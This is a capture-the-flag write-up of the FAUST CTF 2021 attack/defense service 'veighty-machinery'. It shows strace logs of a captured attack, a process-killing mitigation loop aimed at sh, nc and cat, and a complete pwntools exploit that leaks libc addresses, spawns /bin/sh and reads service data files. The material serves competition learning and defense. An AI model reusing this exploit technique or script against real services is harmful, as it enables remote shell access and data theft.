# FAUST CTF 2021

## /srv/veighty-machinery

This was an [Attack/Defense](https://2020.faustctf.net/information/attackdefense-for-beginners/) CTF.  There's no task description or Jeopardy-style scoring.  Just, attack, defend, and maintain SLAs.

Tags: _pwn_ _x86-64_ _remote-shell_ _a/d_ _shameless_


## Summary

```
Go program your
                  __
                 /  \
           .-.  |    |
   *    _.-'  \  \__/
    \.-'       \
   /          _/
  |      _  /"
  |     /_\'
   \    \_/
    """"
Give me your bytecode!
I will load the cannon and execute it.
```

Bytecode!  _(Groan)_, I have near zero skills in this area.

**Plan B: Wait to be attacked and learn from our attackers.**


## Honeypot

Enable `strace` on the service by editing `/etc/systemd/system/veighty-machinery@.service` and changing:

```
ExecStart=-/srv/veighty-machinery/veighty-machinery
```

to:

```
ExecStart=-/usr/bin/strace -ttt -f -ff -o /strace/veighty /srv/veighty-machinery/veighty-machinery
```

then enable with:

```bash
systemctl daemon-reload
```

Now, wait for it.....

```
/strace/veighty.1627021
```

Got one!

Inspecting reveals the success of the attack:

```
1623530151.329429 write(1, "/bin/sh;P\376\347\277z\177", 14) = 14
1623530151.329612 write(1, "\n", 1)     = 1
1623530151.329752 rt_sigaction(SIGINT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f7abfe72d60}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
1623530151.329927 rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f7abfe72d60}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
1623530151.330067 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
1623530151.330199 mmap(NULL, 36864, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7f7abfe2e000
1623530151.330325 rt_sigprocmask(SIG_BLOCK, ~[], [CHLD], 8) = 0
1623530151.330456 clone(child_stack=0x7f7abfe36ff0, flags=CLONE_VM|CLONE_VFORK|SIGCHLD) = 1627315
```

Clearly our _guest_ is trying to get a remote shell, and the `clone` indicates success.  The forked process is `1627315`, I wonder what that reveals:

```
+++ killed by SIGTERM +++
```

Muhahahahaha...


## Mitigation

Our standard starting mitigation:

```bash
while :; do for uid in $(cat serviceusers); do pkill -e -U $uid 'sh|nc|cat'; done; done | tee servicekill.log
```

Until we can figure out how to patch, this catches many would be exploits, including the above.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('/srv/veighty-machinery/veighty-machinery')

p = remote('fd66:666:1::2', 7777)

p.sendlineafter('Length:\n','24')

payload = b'\30\30\30\27\27\27\3\25\2\2\2\2\2\2\3\2\2\2\2\2\30\30\27!CCCCCCCCCCCCCCCC\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nBBBBBBBBBBBBBBBB\n'

p.sendafter('Bytecode:\n',payload)
p.sendafter('CCCCCCCCCCCCCCCC\n','\10\22\0\0\0\0\0\0')

foo = int(p.recvline().strip().decode(),16)
bar = foo + 12936
p.send(p64(bar))
foobar = bar - 1544216

payload  = 16 * b'D'
payload += b'\n'
payload += b'/bin/sh;'
payload += p64(foobar)

p.sendline(payload)
p.sendline('head data/*')
p.sendline('echo shell')
_ = p.recvuntil('shell')
print(_)
p.close()
```

I cannot tell you how this works, just that is does work.  However, [Perfect Blue](https://ctftime.org/team/53802) can tell you exactly how this works: [https://github.com/perfectblue/ctf-writeups/tree/master/2021/faustctf-2021/veighty-machinery](https://github.com/perfectblue/ctf-writeups/tree/master/2021/faustctf-2021/veighty-machinery).

All I did was follow the `strace`, clearly they were leaking addresses and doing some math (`strace` output included in this directory).

If you've done any CTF pwn challenges you'll recognize base and libc addresses, and you can compute the deltas by computing the difference between what was read vs. write, e.g.:

```
1623530151.230314 write(1, "0x7f7abfff5be0\n", 15) = 15
1623530151.230374 write(1, "0x7f7abfff5be0\n", 15) = 15
1623530151.230428 write(1, "0x511\n", 6) = 6
1623530151.230483 write(1, "0x0\n", 4)  = 4
1623530151.230533 write(1, "0x556f6b47d010\n", 15) = 15
1623530151.230581 write(1, "0x556f6b4867f0\n", 15) = 15
1623530151.230630 read(0, "h\216\377\277z\177\0\0", 8) = 8
```

After the initial payload, this address (`0x7f7abfff5be0`) is received, looks like libc to me, what exactly, dunno, don't care, then our attacker sent back `h\216\377\277z\177\0\0` (`0x7f7abfff8e68`), the difference is `12936`.  So for our exploit script, we just need to add that number to whatever address we receive and send it back.  _Why?_  I have no idea.  We're just copying another's exploit and need ours to behave exactly the same.  Repeat for the rest of the `strace` dump.

A/D is just the best.
